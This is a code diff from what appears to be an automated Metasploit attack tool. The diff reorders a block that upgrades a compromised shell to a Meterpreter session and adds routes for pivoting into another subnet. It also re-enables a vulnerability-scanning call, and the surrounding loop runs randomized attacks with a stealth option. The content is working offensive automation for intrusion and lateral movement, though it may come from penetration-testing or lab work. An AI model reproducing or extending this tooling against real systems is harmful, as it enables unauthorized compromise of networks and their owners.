@@ -65,6 +65,23 @@ def main_procedure (attacker_ip, config_file, stealth=False, stealth_sleep=0):
         attack=list(Attack_DB.attack_dict)
 
         randomized_attack=random.sample(attack,len(attack))
+
+        if(target_ip in other_subnet and other_subnet[target_ip]=="yes"):
+            if(atk_sess==None):
+                print(f"{C.COL_RED}[-] subnet not reachable, no intermediate session available{C.COL_RESET}") 
+                return 
+            print(f"{C.COL_YELLOW}[*] other subnet found, adding new routes{C.COL_RESET}")
+            met_sess=mc.upgrade_shell(atk_sess)
+            if(met_sess):
+                print(f"{C.COL_YELLOW}[*] Meterpreter session received, adding routes{C.COL_RESET}")
+                mc.route_add(met_sess["id_sess"], target_ip)
+                mc.route_print()
+                router=met_sess
+                print("router")
+                print(router)
+            else:
+                print(f"{C.COL_RED}[*] Meterpreter session not received, can't add routes, skipping...{C.COL_RESET}")
+                continue
         
         if(stealth):
             scans=list(Attack_DB.stealth_scans_dict)
@@ -85,25 +102,10 @@ def main_procedure (attacker_ip, config_file, stealth=False, stealth_sleep=0):
         scan_obj=Metasploit_Attack(scan_name,scan_instr,scan_wait,mc)
         print(f"{C.COL_YELLOW}[*] Scanning for vulnerabilities {C.COL_RESET}")
         
-        if(target_ip in other_subnet and other_subnet[target_ip]=="yes"):
-            if(atk_sess==None):
-                print(f"{C.COL_RED}[-] subnet not reachable, no intermediate session available{C.COL_RESET}") 
-                return 
-            print(f"{C.COL_YELLOW}[*] other subnet found, adding new routes{C.COL_RESET}")
-            met_sess=mc.upgrade_shell(atk_sess)
-            if(met_sess):
-                print(f"{C.COL_YELLOW}[*] Meterpreter session received, adding routes{C.COL_RESET}")
-                mc.route_add(met_sess["id_sess"], target_ip)
-                mc.route_print()
-                router=met_sess
-                print("router")
-                print(router)
-            else:
-                print(f"{C.COL_RED}[*] Meterpreter session not received, can't add routes, skipping...{C.COL_RESET}")
-                continue
+      
 
     
-        #mc.attempt_scan(scan_obj)
+        mc.attempt_scan(scan_obj)
 
         for ra in randomized_attack:
             attack_name=Attack_DB.attack_dict[ra].attack
